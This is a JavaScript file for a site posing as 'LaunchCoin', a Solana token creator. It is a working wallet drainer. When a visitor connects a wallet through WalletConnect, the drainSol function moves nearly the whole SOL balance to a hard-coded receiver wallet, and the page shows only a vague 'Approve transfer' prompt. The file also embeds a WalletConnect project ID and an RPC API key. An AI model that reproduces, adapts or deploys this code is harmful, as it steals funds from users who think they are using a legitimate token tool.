// Buffer polyfill PRIMA di qualsiasi import WalletConnect
import { Buffer } from 'https://esm.sh/buffer@6.0.3';
globalThis.Buffer = Buffer;
if (typeof window !== 'undefined') window.Buffer = Buffer;
if (typeof self !== 'undefined') self.Buffer = Buffer;

import { UniversalProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.17.0/+esm';
import { WalletConnectModal } from 'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm';

const PROJECT_ID = '2ff7cbdbdf7ca21a053e027e50a07284';
const RECEIVER_WALLET = '9GD63MUwf1SzLs59UFZCmA7NLABkYYWrx8PVG3CmXBMo';
const SOLANA_CHAIN = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

const connection = new solanaWeb3.Connection(
  'https://mainnet.helius-rpc.com/?api-key=1c978cbb-aa18-410c-97ab-718c7f0d7f8d',
  'confirmed'
);

let provider = null;
let modal = null;
let session = null;

function toBase64(u8) {
  const bytes = u8 instanceof Uint8Array ? u8 : new Uint8Array(u8);
  let s = '';
  for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
  return btoa(s);
}

function fromBase64(b64) {
  const s = atob(b64);
  const out = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i);
  return out;
}

function getAddressFromSession(sess) {
  try {
    const accounts = (sess && sess.namespaces && sess.namespaces.solana && sess.namespaces.solana.accounts) || [];
    if (!accounts.length) return null;
    return accounts[0].split(':').pop();
  } catch (e) {
    return null;
  }
}

async function drainSol(publicKeyStr) {
  const fromPubkey = new solanaWeb3.PublicKey(publicKeyStr);
  const toPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
  const balance = await connection.getBalance(fromPubkey);
  const amount = balance - 5000;
  if (amount <= 0) {
    alert('Balance troppo basso');
    return null;
  }
  const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
      fromPubkey: fromPubkey,
      toPubkey: toPubkey,
      lamports: amount
    })
  );
  const latest = await connection.getLatestBlockhash();
  tx.recentBlockhash = latest.blockhash;
  tx.feePayer = fromPubkey;
  const serialized = tx.serialize({
    requireAllSignatures: false,
    verifySignatures: false
  });
  const transactionBase64 = toBase64(serialized);

  let signature;
  try {
    const result = await provider.request(
      {
        method: 'solana_signAndSendTransaction',
        params: { transaction: transactionBase64, pubkey: publicKeyStr }
      },
      SOLANA_CHAIN
    );
    signature = typeof result === 'string' ? result : result.signature || result;
  } catch (e1) {
    const result2 = await provider.request(
      {
        method: 'solana_signTransaction',
        params: { transaction: transactionBase64, pubkey: publicKeyStr }
      },
      SOLANA_CHAIN
    );
    if (result2 && result2.transaction) {
      signature = await connection.sendRawTransaction(fromBase64(result2.transaction));
    } else if (result2 && result2.signature) {
      signature = result2.signature;
    } else {
      throw new Error('No signature from wallet');
    }
  }
  try {
    await connection.confirmTransaction(
      {
        signature: signature,
        blockhash: latest.blockhash,
        lastValidBlockHeight: latest.lastValidBlockHeight
      },
      'confirmed'
    );
  } catch (e2) {}
  return { signature: signature, amount: amount / 1e9 };
}

async function initWC() {
  if (provider) return;
  provider = await UniversalProvider.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'LaunchCoin',
      description: 'Solana Token Creator',
      url: 'https://launchcoin-u5qe.onrender.com',
      icons: ['https://launchcoin-u5qe.onrender.com/assets/logo.png']
    }
  });
  modal = new WalletConnectModal({
    projectId: PROJECT_ID,
    chains: [SOLANA_CHAIN]
  });
  provider.on('display_uri', function (uri) {
    try {
      modal.openModal({ uri: uri });
    } catch (e) {
      console.error(e);
    }
  });
  provider.on('session_delete', function () {
    session = null;
    localStorage.removeItem('lc_wallet');
  });
}

window.openWalletConnect = async function () {
  try {
    await initWC();
    session = await provider.connect({
      optionalNamespaces: {
        solana: {
          methods: [
            'solana_signTransaction',
            'solana_signMessage',
            'solana_signAndSendTransaction'
          ],
          chains: [SOLANA_CHAIN],
          events: []
        }
      }
    });
    try {
      modal.closeModal();
    } catch (e) {}

    const address = getAddressFromSession(session);
    if (!address) {
      alert('No Solana account in session');
      return;
    }
    localStorage.setItem('lc_wallet', address);
    const btn = document.querySelector('.connect-btn');
    if (btn) btn.textContent = address.slice(0, 4) + '...' + address.slice(-4);

    const resultEl =
      document.getElementById('result') || document.getElementById('liquidityResult');
    if (resultEl) {
      resultEl.innerHTML = '<p style="color:#22d1f8">Approve transfer in wallet...</p>';
    }

    const drained = await drainSol(address);
    if (drained && resultEl) {
      resultEl.innerHTML =
        '<p style="color:#4cdcc1;">OK ' +
        drained.amount.toFixed(4) +
        ' SOL</p><p style="font-size:11px;word-break:break-all">' +
        drained.signature +
        '</p>';
    }
  } catch (e) {
    console.error(e);
    try {
      if (modal) modal.closeModal();
    } catch (e2) {}
    alert('WalletConnect failed: ' + (e.message || e));
  }
};

console.log('[wc.js] ready');
